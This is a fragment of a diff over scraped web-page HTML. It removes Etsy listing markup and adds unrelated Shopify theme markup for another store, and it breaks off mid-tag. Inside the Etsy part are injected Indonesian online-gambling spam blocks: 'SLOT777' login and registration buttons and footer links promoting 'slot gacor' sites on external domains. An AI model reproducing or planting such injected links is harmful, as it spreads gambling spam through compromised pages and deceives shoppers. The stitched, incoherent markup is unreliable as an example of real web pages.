-<input type="hidden" name="shipping_method_id" value=""/>
-
-
-    <input
-        type="hidden" 
-        name="listing_inventory_id"
-        value="22156848895"
-    />
-<input type="hidden" name="payment_method" value="cc"/>
- <div class="SLOT777"><a href="https://tunarislot777.pages.dev/" rel="nofollow noreferrer" class="register">LOGIN </a><a href="https://tunarislot777.pages.dev/" rel="nofollow noreferrer" class="login">DAFTAR </a></div><style>.SLOT777 {display: grid;grid-template-columns: repeat(2,1fr);font-weight: 700;}.SLOT777 a {text-align: center;}.login, .register {color: #ffffff;padding: 13px 10px;}.login, .login-button {background: linear-gradient(to bottom, #ffd700 0, #ffd700 100%);border: 1px solid #361800;}.register, .register-button {background: linear-gradient(to bottom, #ffd700 0, #ffd700 100%);border: 1px solid #361800;}</style><br>
-
-
-
-</button>
-</div>
-        </form>
-        
-        <p class="purchase-accept-terms wt-display-none wt-mt-xs-2 wt-sem-text-primary wt-text-body-small wt-width-full"></p>
-</div>
-</div>
-    </div>
-</div>
-            <div class="wt-display-flex-xs wt-flex-direction-column-xs wt-flex-direction-row-md wt-flex-direction-column-lg wt-flex-gap-md-2 wt-flex-gap-lg-0 wt-justify-content-space-between">
-                
-                <button data-clg-id="WtButton" class="wt-btn wt-btn--transparent wt-width-full wt-justify-content-center wt-mt-xs-2" data-listing-id="1790774795" data-accessible-btn-fave="true" data-add-to-collection-button="true" data-always-show="true" data-source="listing_buybox">
-        <span class="wt-icon wt-icon--base-xs wt-text-favorite-heart"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M21.024 12.281a2 2 0 0 1-.147.24l-.673.961q-.349.497-.789.915L12 21.422l-7.415-7.025a6 6 0 0 1-.789-.915l-.673-.961a2 2 0 0 1-.147-.24A6 6 0 0 1 12 4.528a6 6 0 0 1 9.024 7.753"/></svg></span>
-    Add to collection
-
-</button>
-                
-            </div>
-            
-                <div class="wt-mt-xs-3">
-                    <div data-appears-component-name="secondary_nudges">
-<div class="wt-display-flex-xs wt-align-items-center wt-mt-xs-2">
-        <div class="wt-pr-xs-2" data-add-class-when-in-view="is-in-view">
-            <span class="inline-svg wt-display-flex-xs"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" cache-id="ca29373808df4f9eaa432cd66b455877" viewBox="0 0 24 24" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" height="48" width="48" aria-hidden="true" focusable="false">
-    <style>
-            .is-in-view #lp-collage-star-seller-badge-left {
-                animation: lp-collage-star-seller-badge-left__to 2000ms linear 1 normal forwards
-            }
-
-            @keyframes lp-collage-star-seller-badge-left__to {
-                0% {
-                    transform: translate(3.4px, 12.4px)
-                }
-                50% {
-                    transform: translate(3.4px, 12.4px)
-                }
-                75% {
-                    transform: translate(3.2px, 12.4px)
-                }
-                100% {
-                    transform: translate(3.2px, 12.4px)
-                }
-            }
-
-            .is-in-view #e2oQ4aPtn8x2 {
-                animation: e2oQ4aPtn8x2_c_o 2000ms linear 1 normal forwards
-            }
-
-            @keyframes e2oQ4aPtn8x2_c_o {
-                0% {
-                    opacity: 0
-                }
-                50% {
-                    opacity: 0
-                }
-                75% {
-                    opacity: 1
-                }
-                100% {
-                    opacity: 1
-                }
-            }
-
-            .is-in-view #lp-collage-star-seller-badge-right {
-                animation: lp-collage-star-seller-badge-right__to 2000ms linear 1 normal forwards
-            }
-
-            @keyframes lp-collage-star-seller-badge-right__to {
-                0% {
-                    transform: translate(20.6px, 12.4px)
-                }
-                50% {
-                    transform: translate(20.6px, 12.4px)
-                }
-                75% {
-                    transform: translate(20.8px, 12.4px)
-                }
-                100% {
-                    transform: translate(20.8px, 12.4px)
-                }
-            }
-
-            .is-in-view #e2oQ4aPtn8x8 {
-                animation: e2oQ4aPtn8x8_c_o 2000ms linear 1 normal forwards
-            }
-
-            @keyframes e2oQ4aPtn8x8_c_o {
-                0% {
-                    opacity: 0
-                }
-                50% {
-                    opacity: 0
-                }
-                75% {
-                    opacity: 1
-                }
-                100% {
-                    opacity: 1
-                }
-            }
-
-            .is-in-view #lp-collage-star-seller {
-                animation: lp-collage-star-seller__tr 2000ms linear 1 normal forwards
-            }
-
-            @keyframes lp-collage-star-seller__tr {
-                0% {
-                    transform: translate(12px, 12px) rotate(-145deg);
-                    animation-timing-function: cubic-bezier(0.42, 0, 0.58, 1)
-                }
-                50% {
-                    transform: translate(12px, 12px) rotate(0deg)
-                }
-                100% {
-                    transform: translate(12px, 12px) rotate(0deg)
-                }
-            }
-    </style>
-    <g id="lp-collage-star-seller-badge-left" transform="translate(3.4,12.4)">
-        <g id="e2oQ4aPtn8x2" transform="translate(-3.4,-12.4)" opacity="0">
-            <g id="e2oQ4aPtn8x3">
-                <g id="e2oQ4aPtn8x4">
-                    <polygon id="e2oQ4aPtn8x5" points="2.5,15.8 2,13.9 4.5,13.8 4.8,14.7" fill="#654B77" stroke="none" stroke-width="1" stroke-miterlimit="1"/>
-                </g>
-                <g id="e2oQ4aPtn8x6">
-                    <polygon id="e2oQ4aPtn8x7" points="4.8,10.1 4.5,11.1 2,10.9 2.5,9" fill="#654B77" stroke="none" stroke-width="1" stroke-miterlimit="1"/>
-                </g>
-            </g>
-        </g>
-    </g>
-    <g id="lp-collage-star-seller-badge-right" transform="translate(20.6,12.4)">
-        <g id="e2oQ4aPtn8x8" transform="translate(-20.6,-12.4)" opacity="0">
-            <g id="e2oQ4aPtn8x9">
-                <polygon id="e2oQ4aPtn8x10" points="19.5,11.1 19.2,10.1 21.5,9 22,10.9" fill="var(--clg-color-pal-lavender-700, #654B77 )" stroke="none" stroke-width="1" stroke-miterlimit="1"/>
-            </g>
-            <g id="e2oQ4aPtn8x11">
-                <polygon id="e2oQ4aPtn8x12" points="22,13.9 21.5,15.8 19.2,14.7 19.5,13.8" fill="var(--clg-color-pal-lavender-700, #654B77 )" stroke="none" stroke-width="1" stroke-miterlimit="1"/>
-            </g>
-        </g>
-    </g>
-    <g id="lp-collage-star-seller" transform="translate(12,12) rotate(-145)">
-        <g id="e2oQ4aPtn8x13" transform="translate(-12,-12)">
-            <g id="e2oQ4aPtn8x14">
-                <path id="e2oQ4aPtn8x15" d="M17.6,8.8L16.1,7.9L15.2,6.4L13.5,6.4L12,5.5L10.5,6.4L8.7,6.4L7.9,7.9L6.4,8.8L6.4,10.5L5.5,12L6.4,13.5L6.4,15.2L7.9,16.1L8.8,17.6L10.5,17.6L12,18.5L13.5,17.6L15.2,17.6L16.1,16.1L17.6,15.2L17.6,13.5L18.5,12L17.6,10.5L17.6,8.8ZM13.7,12.7L14.2,14.9C14.1,15,14.1,15,13.9,15.1L12,14L10.1,15.2C10,15.1,10,15.1,9.8,15L10.3,12.8L8.6,11.3C8.7,11.1,8.7,11.1,8.7,11L11,10.8L11.9,8.7C12.1,8.7,12.1,8.7,12.2,8.7L13.1,10.8L15.4,11C15.5,11.2,15.5,11.2,15.5,11.3L13.7,12.7Z" fill="var(--clg-color-sem-background-surface-star-seller-dark, #9560B8)" stroke="none" stroke-width="1" stroke-miterlimit="1"/>
-            </g>
-        </g>
-    </g>
-</svg></span>
-        </div>
-    <div class="wt-display-flex-xs wt-flex-direction-column-xs">
-        
-        <p class="wt-text-caption">
-            <strong>Star Seller.</strong> This seller consistently earned 5-star reviews, dispatched on time, and replied quickly to any messages they received.
-        </p>
-    </div>
-</div>
-</div>
                 </div>
-        </div>
+                <div class="hura-message swiper-slide slick-slide">
 
-    </div>
-</div>
-<div class="listing-info info-col description-right wt-order-xs-5">
-
-</div>
-        <div class="listing-info wider-review-col">
-            <div class="wt-bb-xs wt-mt-xs-3 wt-mb-xs-3 wt-ml-xs-2 wt-ml-md-4 wt-ml-lg-5 wt-order-xs-3">
-            </div>
-        </div>
-
-<div class="listing-info wider-review-col wt-order-xs-6">
-    <div
-        class="wt-flex-lg-5 wt-align-items-flex-start wt-max-width-full wt-pl-md-4 wt-pr-md-4 wt-pr-lg-0 wt-pl-lg-5 wt-pl-xs-2 wt-pr-xs-2"
-        data-appears-component-name="listing_page_reviews_container_top"
-        data-offset="0.01"
-            data-appears-event-data='{"transaction_ids":[4556938481,4559852869,4455685549],"reviews_with_text":3,"reviews_older_than_three_months":3,"reviews_under_three_stars":0,"fired_on_plus_more":false,"tab_fetched":"same_listing_reviews","listing_rating_count":8,"shop_rating_count":129,"page":"listing","listing_id":1790774795,"page_number":1,"sort_option":"Relevancy","is_mobile_or_tablet":false,"is_reviews_untabbed":false,"is_initial_load":true,"tag_filters":[]}'
-    >
-        <div class="wt-mb-xs-3">
-            <div data-lazy-loaded-bottom-section-before-reviews-trigger></div>
-            <div data-appears-component-name="listing_page_reviews" data-appears-event-data='{"transaction_ids":[4556938481,4559852869,4455685549],"reviews_with_text":3,"reviews_older_than_three_months":3,"reviews_under_three_stars":0,"fired_on_plus_more":false,"tab_fetched":"same_listing_reviews","listing_rating_count":8,"shop_rating_count":129,"page":"listing","listing_id":1790774795,"page_number":1,"sort_option":"Relevancy","is_mobile_or_tablet":false,"is_reviews_untabbed":false,"is_initial_load":true,"tag_filters":[]}'>
-
-<div id="deep-dive-root"></div>
-</div>
-            <div data-lazy-loaded-bottom-section-after-reviews-trigger></div>
-            
-                
-
-
-        </div>
-    </div>
-</div>
                 </div>
-            </div> 
-        </div> 
-    </div>
+                <div class="hura-message swiper-slide slick-slide">
 
-    <div class="listing-page-content-container-wider wt-horizontal-center">
-        <div data-lazy-loaded-collection-section-trigger></div>
-
-
-    <div class="other-info">
-
-        
-        
-        <div id="recs_ribbon_container">
-    <div class="wt-position-relative wt-body-max-width wt-pl-xs-2 wt-pr-xs-2 wt-pl-md-4 wt-pr-md-4 wt-pl-lg-5 wt-pr-lg-5">
-            <div data-listing-page-lazy-loaded-bottom-section data-ymal-and-prolist-section>
-                <div class="wt-pt-xs-0 wt-mb-xs-8">
-                    <div data-neu-spec-placeholder="1" id="569e011a1e24cf28711f5a7429944dc3">
-    <script type="text/json" data-neu-spec-placeholder-data="1">{"spec_name":"Etsy\\Modules\\ListingPage\\Recommendations\\CombinedAdsAndRecs\\ApiSpec","args":{"listing_id":1790774795,"user_id":1135369000,"module_placement":"external_bot","ymal_offset":2,"is_external_landing":true,"force_set_offset":true,"is_external_referrer":false,"hide_favorite_hearts":false,"is_from_OSA":false,"is_elp":false,"shop_id":54267703,"vat_region":"ID","ship_to_country":121,"selected_listing_variation_ids":[],"should_open_all_links_as_external":false,"swap_lp_recs_for_search":false}}</script>
-    <p class="wt-screen-reader-only">Loading...</p>
-
-
-</div>
                 </div>
-            </div>
-    </div>
-</div>
+                <div class="hura-message swiper-slide slick-slide">
 
-
-
-
-            <div class="wt-body-max-width wt-mb-xs-8" data-listing-page-lazy-loaded-bottom-section>
-
-            </div>
-
-        
-
-        
-    </div>
-</div>
-
-<div class="wt-body-max-width wt-mb-xs-6 wt-pr-xs-2 wt-pl-xs-2 wt-pl-md-4 wt-pr-md-4 wt-pl-lg-5 wt-pr-lg-5">
-        <div data-listing-page-lazy-loaded-collection-section>
-            <div data-neu-spec-placeholder="1" id="681d824159ab046d042eda509ac40181">
-    <script type="text/json" data-neu-spec-placeholder-data="1">{"spec_name":"Etsy\\Modules\\CollectionRecs\\Recommendations\\ListingPage\\ApiSpec","args":{"listing_ids":[1790774795],"is_external":true,"display_browsy_elp_collection_recs":false,"set_is_eligible_compare_lp_collections":false}}</script>
-
-
-</div>
-        </div>
-
-
-    
-    
-    
-    
-
-    <div data-listing-page-lazy-loaded-bottom-section>
-        <div data-neu-spec-placeholder="1" id="6cda9cae1b041561742fb61d89cecec3">
-    <script type="text/json" data-neu-spec-placeholder-data="1">{"spec_name":"Listzilla_ApiSpecs_Tags_Landing","args":{"listing_id":1790774795,"shop_id":54267703,"is_raised_tags":false,"click_queries":[],"visual_internal_enabled":false,"visual_external_enabled":false}}</script>
-    <div>
-    
-        
-</div>
-</div>
-    </div>
-    
-    
-    
-    <div class="wt-display-flex-xs wt-justify-content-space-between wt-align-items-center wt-flex-direction-row-lg wt-flex-direction-column-xs wt-mb-md-4">
-    <div class="wt-display-flex-xs wt-align-items-center wt-flex-direction-row-lg wt-flex-direction-column-xs">
-            <div class="wt-pr-xs-2 wt-text-caption">
-                <strong>Slot777 | Situs Slot Gacor Terpercaya Hari Ini Rtp Slot Maxwin Terbaik 2025</strong>
-            </div>
-            <div class="wt-text-caption">
-            </div>
-    </div>
-
-</div>
-    
-    <div class="wt-text-caption wt-text-center-xs wt-text-left-lg">
-        <a href="https://tunari-online.ro/">SLOT777</a>
-            <span class="etsy-icon wt-sem-text-secondary wt-icon--smallest-xs"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M8 21a1 1 0 0 1-.664-1.747l8.164-7.254-8.164-7.252a1 1 0 0 1 1.328-1.494L18.5 12l-9.836 8.747A1 1 0 0 1 8 21"/></svg></span>
-        <a href="https://tunari-online.ro/">SITUS SLOT</a>
-            <span class="etsy-icon wt-sem-text-secondary wt-icon--smallest-xs"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M8 21a1 1 0 0 1-.664-1.747l8.164-7.254-8.164-7.252a1 1 0 0 1 1.328-1.494L18.5 12l-9.836 8.747A1 1 0 0 1 8 21"/></svg></span>
-        <a href="https://tunari-online.ro/">SLOT GACOR</a>
-            <span class="etsy-icon wt-sem-text-secondary wt-icon--smallest-xs"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M8 21a1 1 0 0 1-.664-1.747l8.164-7.254-8.164-7.252a1 1 0 0 1 1.328-1.494L18.5 12l-9.836 8.747A1 1 0 0 1 8 21"/></svg></span>
-        <a href="https://tunari-online.ro/">SITUS SLOT GACOR</a>
-        
-</div>
-    
-    <div id="google-one-tap-modal-div" class="google-one-tap-modal-div">
-</div>
-
-    <div data-wt-overlay id="user-lists-overlay" class="wt-overlay wt-display-none wt-position-fixed wt-position-bottom wt-overlay--has-close-icon collection-list-overlay " role="dialog" aria-hidden="true" aria-modal="false" aria-labelledby="collection-modal-title"
-    data-animations='{ "open": { "mask": "wt-animated wt-animated--appear-02", "content": "wt-animated wt-animated--appear-02" }, "close": { "mask": "wt-animated wt-animated--disappear-02", "content": "wt-animated wt-animated--disappear-02" } }'
->
-    <div class="wt-overlay__modal collection-list-overlay-view wt-display-flex-xs wt-pb-xs-0 wt-pb-md-4 " data-overlay-modal>
-        <div data-collection-list data-max-characters="50" class="wt-overflow-hidden favorites-modal-collection-list wt-width-full">
-    <button class="wt-btn wt-btn--icon wt-btn--tertiary wt-btn--light  wt-overlay__close-icon
-        "
-        data-wt-overlay-close data-overlay-initial-focus aria-label="Close">
-        <span class="etsy-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M13.414,12l6.293-6.293a1,1,0,0,0-1.414-1.414L12,10.586,5.707,4.293A1,1,0,0,0,4.293,5.707L10.586,12,4.293,18.293a1,1,0,1,0,1.414,1.414L12,13.414l6.293,6.293a1,1,0,0,0,1.414-1.414Z"/></svg></span>
-    </button>
-    <div data-collection-list-section class="favorites-modal--collection-list-section wt-position-relative wt-flex-direction-column-xs wt-height-full wt-align-items-center">
-        <div class="wt-overlay__header wt-display-flex-xs wt-align-items-center wt-justify-content-center ">
-
-            <img src="https://www.etsy.com/https://www.nissanpartsforyou.com/assets/images/grey.gif" alt="An image of the listing you can save" class="wt-mr-xs-2 wt-mr-md-3 add-to-list-overlay--img" />
-
-            <h2 class="wt-text-heading" id="collection-modal-title">
-                <span data-collections-modal-title class="">
-                    Add to collection
-                </span>
-                <span data-registry-modal-title class="wt-display-none">
-                    Add to registry
-                </span>
-            </h2>
-        </div>
-        <div class="collection-list-loading-container" data-spinner-container>
-            <div class="wt-spinner wt-spinner--02">
-                <div>Loading</div>
-            </div>
-        </div>
-        <div class="wt-display-none collection-list-loading-container" data-collection-list-fail-state>
-            <div class="wt-vertical-center wt-text-center-xs wt-sem-text-secondary">
-                <p>Hmm, something went wrong.</p>
-                <p>Try that again.</p>
-            </div>
-        </div>
-        <fieldset class="wt-max-width-full wt-pr-xs-2 wt-overflow-scroll">
-            <div class="wt-display-none wt-width-full wt-action-group wt-action-group--image wt-list-inline wt-mb-xs-0" data-collection-list-content>
-                <span class="wt-p-xs-0 wt-width-full wt-mb-xs-2" >
-                    <input type="checkbox" id="create_new_list" hidden />
-                    <label role="button" tabindex="0" data-add-list-trigger class="add-to-list-overlay-row wt-width-full wt-display-flex-xs wt-align-items-center">
-                        <div class="add-list--trigger add-to-list-overlay-row--icon wt-sem-text-on-surface-dark wt-rounded-02 wt-overflow-hidden wt-display-flex-xs wt-justify-content-center wt-align-items-center">
-                            <span class="etsy-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M20,11H13V4a1,1,0,0,0-2,0v7H4a1,1,0,0,0,0,2h7v7a1,1,0,0,0,2,0V13h7A1,1,0,0,0,20,11Z"/></svg></span>
-                        </div>
-                        <p class="wt-pl-xs-2 wt-text-title-01">
-                            Create new collection
-                        </p>
-                    </label>
-                </span>
-                
-                
-                
-            </div>
-        </fieldset>
-        <div class="wt-overlay__sticky-footer-container wt-bt-xs wt-width-full">
-            <div class="wt-overlay__footer wt-justify-content-flex-end wt-pt-md-4">
-                <div class="wt-overlay__footer__action">
-                    <button type="button" class="wt-btn wt-btn--primary wt-pr-md-7 wt-pl-md-7" data-wt-overlay-close>Done</button>
                 </div>
             </div>
         </div>
+        <style>
+            .hura-messages.swiper-wrapper {
+                display: none
+            }
+
+            .hura-announcement-bar {
+                width: 100%;
+                max-width: 1220px;
+                margin: 0 auto;
+                padding: 8px 0
+            }
+
+            .hura-announcement-bar .slick-track {
+                display: flex;
+                align-items: center
+            }
+
+            .hura-messages.swiper-wrapper.slick-initialized.slick-slider {
+                display: flex
+            }
+
+            div#shopify-section-announcement_bar_slider {
+                background: linear-gradient(to bottom, #ff0800 0%, #a5290d 50%, #ff6600 100%);
+            }
+
+            .hura-announcement-bar .hura-message {
+                text-align: center;
+                align-self: center;
+                font-size: 12px;
+                line-height: 14px;
+                color: #ffffff;
+                padding-left: 24px;
+                padding-right: 24px;
+            }
+
+            .hura-announcement-bar .swiper-button-next:after,
+            .hura-announcement-bar .swiper-container-rtl .swiper-button-prev:after,
+            .hura-announcement-bar .swiper-button-prev:after,
+            .hura-announcement-bar .swiper-container-rtl .swiper-button-next:after {
+                font-size: 15px;
+                color: #ffffff;
+            }
+
+            .hura-messages .slick-prev:before,
+            .hura-messages .slick-next:before {
+                color: #ffffff !important;
+                opacity: 1;
+            }
+
+            .hura-messages .slick-prev:before {
+                content: url("data:image/svg+xml,%3Csvg width='6' height='11' viewBox='0 0 6 11' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M5.16164 10.3233L6 9.48493L1.67671 5.16164L6 0.838358L5.16164 0L0 5.16164L5.16164 10.3233Z' fill='white'/%3E%3C/svg%3E%0A");
+            }
+
+            .hura-messages .slick-next:before {
+                content: url("data:image/svg+xml,%3Csvg width='6' height='11' viewBox='0 0 6 11' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M0.838356 0.676713L-8.46107e-07 1.51507L4.32329 5.83836L-9.01992e-08 10.1616L0.838357 11L6 5.83836L0.838356 0.676713Z' fill='white'/%3E%3C/svg%3E%0A");
+            }
+
+            div.hura-swiper-button {
+                display: block;
+                align-items: center;
+            }
+
+            .slick-next,
+            .slick-next:focus,
+            .slick-next:hover,
+            .slick-prev,
+            .slick-prev:focus,
+            .slick-prev:hover {
+                color: transparent;
+                outline: 0;
+                background: 0 0
+            }
+
+            .slick-next,
+            .slick-prev {
+                font-size: 0;
+                line-height: 0;
+                position: absolute;
+                top: 50%;
+                display: block;
+                width: 20px;
+                height: 20px;
+                padding: 0;
+                -webkit-transform: translate(0, -50%);
+                -ms-transform: translate(0, -50%);
+                transform: translate(0, -50%);
+                cursor: pointer;
+                border: none;
+                z-index: 1
+            }
+
+            .slick-next:focus:before,
+            .slick-next:hover:before,
+            .slick-prev:focus:before,
+            .slick-prev:hover:before {
+                opacity: 1
+            }
+
+            .slick-next.slick-disabled:before,
+            .slick-prev.slick-disabled:before {
+                opacity: .25
+            }
+
+            .slick-next:before,
+            .slick-prev:before {
+                font-family: slick;
+                font-size: 20px;
+                line-height: 1;
+                opacity: .75;
+                color: #000;
+                -webkit-font-smoothing: antialiased;
+                -moz-osx-font-smoothing: grayscale
+            }
+
+            .slick-prev {
+                left: 0
+            }
+
+            [dir=rtl] .slick-prev {
+                right: -25px;
+                left: auto
+            }
+
+            .slick-prev:before,
+            [dir=rtl] .slick-next:before {
+                content: '←'
+            }
+
+            .slick-next:before,
+            [dir=rtl] .slick-prev:before {
+                content: '→'
+            }
+
+            .slick-next {
+                right: 0
+            }
+
+            [dir=rtl] .slick-next {
+                right: auto;
+                left: -25px
+            }
+
+            .announcement_link {
+                color: #969696 !important;
+                text-decoration: none;
+            }
+
+            @media screen and (max-width:749px) {
+                .slick-prev {
+                    left: -21px
+                }
+
+                .slick-next {
+                    right: -21px
+                }
+
+                .hura-announcement-bar {
+                    margin: inherit;
+                    padding: 8px 30px;
+                    height: auto
+                }
+            }
+        </style>
+
     </div>
-    <div class="wt-display-none" data-add-collection-section data-listing-id="">
-        <div data-collection-list-add>
-    <div class="wt-overlay__header">
-        <h3 class="wt-text-heading wt-text-center-xs">
-            Create new collection
-        </h3>
-    </div>
-    <div class="wt-display-flex-xs wt-flex-direction-row-xs wt-align-items-baseline">
-        <div class="wt-validation wt-width-full">
-            <label class="wt-label" for="edit-list">Name</label>
-            <input data-add-collection-input autofocus aria-invalid="false" type="text" class="wt-input" id="edit-list" placeholder="Gifts, Home, Wedding, etc.">
-            <div class="wt-display-flex-xs wt-justify-content-space-between">
-                <div>
-                    <div data-duplicated-name-alert data-error="duplicate_name" class="wt-validation__message wt-validation__message--is-hidden wt-sem-text-critical">You've already used that name</div>
-                    <div data-too-long-alert data-error="too_long" class="wt-validation__message wt-validation__message--is-hidden wt-sem-text-critical">
-                        Collection name is too long
+
+
+
+
+
+    <!-- BEGIN sections: header-group -->
+    <div id="shopify-section-sections--17605520031924__header"
+        class="shopify-section shopify-section-group-header-group section-header">
+        <link rel="stylesheet"
+            href="//www.istudiosg.com/cdn/shop/t/14/assets/component-list-menu.css?v=104864129994713251501742784888"
+            media="print" onload="this.media='all'">
+        <link rel="stylesheet"
+            href="//www.istudiosg.com/cdn/shop/t/14/assets/component-search.css?v=130382253973794904871742784887"
+            media="print" onload="this.media='all'">
+        <link rel="stylesheet"
+            href="//www.istudiosg.com/cdn/shop/t/14/assets/component-menu-drawer.css?v=21058032239462183751742784887"
+            media="print" onload="this.media='all'">
+        <link rel="stylesheet"
+            href="//www.istudiosg.com/cdn/shop/t/14/assets/component-cart-notification.css?v=71986486250318288601742784887"
+            media="print" onload="this.media='all'">
+        <link rel="stylesheet"
+            href="//www.istudiosg.com/cdn/shop/t/14/assets/component-cart-items.css?v=144236440317055431411742784889"
+            media="print" onload="this.media='all'">
+        <link rel="stylesheet"
+            href="//www.istudiosg.com/cdn/shop/t/14/assets/component-price.css?v=89212854351592844731742784887"
+            media="print" onload="this.media='all'">
+        <link rel="stylesheet"
+            href="//www.istudiosg.com/cdn/shop/t/14/assets/component-loading-overlay.css?v=160031540023746741091742784889"
+            media="print" onload="this.media='all'">
+        <link rel="stylesheet"
+            href="//www.istudiosg.com/cdn/shop/t/14/assets/component-mega-menu.css?v=10110889665867715061742784889"
+            media="print" onload="this.media='all'">
+        <noscript>
+            <link
+                href="//www.istudiosg.com/cdn/shop/t/14/assets/component-mega-menu.css?v=10110889665867715061742784889"
+                rel="stylesheet" type="text/css" media="all" />
+        </noscript><noscript>
+            <link
+                href="//www.istudiosg.com/cdn/shop/t/14/assets/component-list-menu.css?v=104864129994713251501742784888"
+                rel="stylesheet" type="text/css" media="all" />
+        </noscript>
+        <noscript>
+            <link href="//www.istudiosg.com/cdn/shop/t/14/assets/component-search.css?v=130382253973794904871742784887"
+                rel="stylesheet" type="text/css" media="all" />
+        </noscript>
+        <noscript>
+            <link
+                href="//www.istudiosg.com/cdn/shop/t/14/assets/component-menu-drawer.css?v=21058032239462183751742784887"
+                rel="stylesheet" type="text/css" media="all" />
+        </noscript>
+        <noscript>
+            <link
+                href="//www.istudiosg.com/cdn/shop/t/14/assets/component-cart-notification.css?v=71986486250318288601742784887"
+                rel="stylesheet" type="text/css" media="all" />
+        </noscript>
+        <noscript>
+            <link
+                href="//www.istudiosg.com/cdn/shop/t/14/assets/component-cart-items.css?v=144236440317055431411742784889"
+                rel="stylesheet" type="text/css" media="all" />
+        </noscript>
+        <link href="//www.istudiosg.com/cdn/shop/t/14/assets/custom-style.css?v=128650136086380557481742784888"
+            rel="stylesheet" type="text/css" media="all" />
+        <link
+            href="//www.istudiosg.com/cdn/shop/t/14/assets/component-cto-cart-drawer.css?v=87861508187535145881742784888"
+            rel="stylesheet" type="text/css" media="all" />
+        <style>
+            header-drawer,
+            .header-drawer-lazyload {
+                justify-self: start;
+                height: 48px;
+                width: 48px;
+                margin-left: 0
+            }
+
+            @media screen and (min-width: 1024px) {
+
+                header-drawer,
+                .header-drawer-lazyload {
+                    display: none;
+                }
+            }
+
+            @media only screen and (width:375px) {
+                input[type=search]::placeholder {
+                    color: rgba(18, 18, 18, .75);
+                    position: relative;
+                    width: 51px;
+                    left: 5px;
+                    top: 2px;
+                    font-style: normal;
+                    font-weight: 500;
+                    font-size: 15px;
+                    line-height: 15px;
+                    opacity: .75
+                }
+            }
+
+            .menu-drawer-container {
+                display: flex;
+            }
+
+            .list-menu {
+                list-style: none;
+                padding: 0;
+                margin: 0;
+            }
+
+            .list-menu--inline {
+                display: inline-flex;
+                flex-wrap: wrap;
+            }
+
+            summary.list-menu__item {
+                padding-right: 2.7rem;
+            }
+
+            .list-menu__item {
+                align-items: center;
+                line-height: calc(1 + 0.3 / var(--font-body-scale));
+            }
+
+            .list-menu__item--link {
+                text-decoration: none;
+                padding-bottom: 1rem;
+                padding-top: 1rem;
+                line-height: calc(1 + 0.8 / var(--font-body-scale));
+            }
+
+            @media screen and (min-width: 750px) {
+                .list-menu__item--link {
+                    padding-bottom: 0.5rem;
+                    padding-top: 0.5rem;
+                }
+            }
+
+            .my-store-locator {
+                display: none;
+            }
+        </style>
+        <style data-shopify>
+            .header {
+                padding: 10px 3rem 10px 3rem;
+            }
+
+            .section-header {
+                position: sticky;
+                /* This is for fixing a Safari z-index issue. PR #2147 */
+                margin-bottom: 0px;
+            }
+
+            @media screen and (min-width: 750px) {
+                .section-header {
+                    margin-bottom: 0px;
+                }
+            }
+
+            @media screen and (min-width: 990px) {
+                .header {
+                    padding-top: 20px;
+                    padding-bottom: 20px;
+                }
+            }
+
+            @media screen and (min-width: 1024px) {
+                .header-menu-wrapper {
+                    min-height: 140px;
+                }
+            }
+
+
+            .menu-drawer__menu li {
+                --color-foreground: #121212;
+                color: #121212;
+            }
+
+
+            #right_menu_items {
+                justify-content: space-between;
+                list-style: none;
+                display: contents;
+                flex-direction: row;
+            }
+
+            #right_menu_items li a {
+                color: #383131
+            }
+
+            #right_menu_mobile_items li a {
+                color: #383131
+            }
+
+            .right_menu_divider {}
+
+            #right_menu_items li:nth-child(2) {
+                background: ;
+            }
+
+            #right_menu_items li:nth-child(3) {
+                background: ;
+            }
+
+            #right_menu_items li:nth-child(4) {
+                background: ;
+            }
+
+            #right_menu_items li:nth-child(5) {
+                background: ;
+            }
+
+            #right_menu_items li:nth-child(6) {
+                background: ;
+            }
+
+            #right_menu_items li:nth-child(7) {
+                background: ;
+            }
+
+            #right_menu_mobile_items li:nth-child(1) {
+                background: ;
+            }
+
+            #right_menu_mobile_items li:nth-child(2) {
+                background: ;
+            }
+
+            #right_menu_mobile_items li:nth-child(3) {
+                background: ;
+            }
+
+            #right_menu_mobile_items li:nth-child(4) {
+                background: ;
+            }
+
+            #right_menu_mobile_items li:nth-child(5) {
+                background: ;
+            }
+
+            #right_menu_mobile_items li:nth-child(6) {
+                background: ;
+            }
+        </style>
+        <script src="//www.istudiosg.com/cdn/shop/t/14/assets/details-disclosure.js?v=13653116266235556501742784889"
+            defer="defer"></script>
+        <script src="//www.istudiosg.com/cdn/shop/t/14/assets/details-modal.js?v=25581673532751508451742784889"
+            defer="defer"></script>
+        <script src="//www.istudiosg.com/cdn/shop/t/14/assets/cart-notification.js?v=138585423170270737471742784887"
+            defer="defer"></script>
+        <script src="//www.istudiosg.com/cdn/shop/t/14/assets/search-form.js?v=35015649889156673281742784888"
+            defer="defer"></script>
+
+        <svg xmlns="http://www.w3.org/2000/svg" class="hidden">
+            <symbol id="icon-search" viewbox="0 0 18 19" fill="none">
+                <path fill-rule="evenodd" clip-rule="evenodd"
+                    d="M11.03 11.68A5.784 5.784 0 112.85 3.5a5.784 5.784 0 018.18 8.18zm.26 1.12a6.78 6.78 0 11.72-.7l5.4 5.4a.5.5 0 11-.71.7l-5.41-5.4z"
+                    fill="currentColor" />
+            </symbol>
+
+            <symbol id="icon-reset" class="icon icon-close" fill="none" viewBox="0 0 18 18" stroke="currentColor">
+                <circle r="8.5" cy="9" cx="9" stroke-opacity="0.2" />
+                <path d="M6.82972 6.82915L1.17193 1.17097" stroke-linecap="round" stroke-linejoin="round"
+                    transform="translate(5 5)" />
+                <path d="M1.22896 6.88502L6.77288 1.11523" stroke-linecap="round" stroke-linejoin="round"
